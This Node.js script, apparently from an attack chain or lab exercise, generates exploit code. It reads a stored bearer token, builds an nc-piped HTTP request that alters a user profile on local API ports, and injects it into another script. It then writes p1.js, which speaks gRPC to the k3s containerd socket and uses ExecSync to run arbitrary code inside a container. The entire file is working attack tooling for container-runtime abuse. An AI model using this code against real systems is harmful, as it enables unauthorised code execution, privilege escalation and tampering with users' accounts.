const fs=require('fs');
const tk=fs.readFileSync('..\\tok_tt.txt','utf8').trim();
const tag='PC'+Math.floor(Math.random()*90000+10000);
let c=fs.readFileSync('cri3.js','utf8');
const body='{"city":"'+tag+'"}';
const CMD='for P in 3000 3001 80; do { printf "POST /api/user/profile HTTP/1.0\\r\\nHost: 127.0.0.1\\r\\nAuthorization: Bearer '+tk+'\\r\\nContent-Type: application/json\\r\\nContent-Length: '+body.length+'\\r\\n\\r\\n'+body+'"; } | nc 127.0.0.1 $P >/dev/null 2>&1; done';
c=c.replace(/const CMD=.*\n/, 'const CMD='+JSON.stringify(CMD)+';\n');
fs.writeFileSync('cri3.js',c);
const p1=`const http2=require('http2'),net=require('net');
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc','te':'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const CODE=${JSON.stringify(c)};
call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,buf)=>{ if(e)return; const ids=[...new Set((buf.toString('latin1').match(/[0-9a-f]{64}/g)||[]))].slice(0,1); if(!ids.length)return; call('/runtime.v1.RuntimeService/ExecSync',Buffer.concat([fl(0x0a,ids[0]),fl(0x12,'/usr/local/bin/node'),fl(0x12,'-e'),fl(0x12,CODE)]),()=>{}); });
`;
fs.writeFileSync('p1.js',p1);
console.log('tag='+tag);
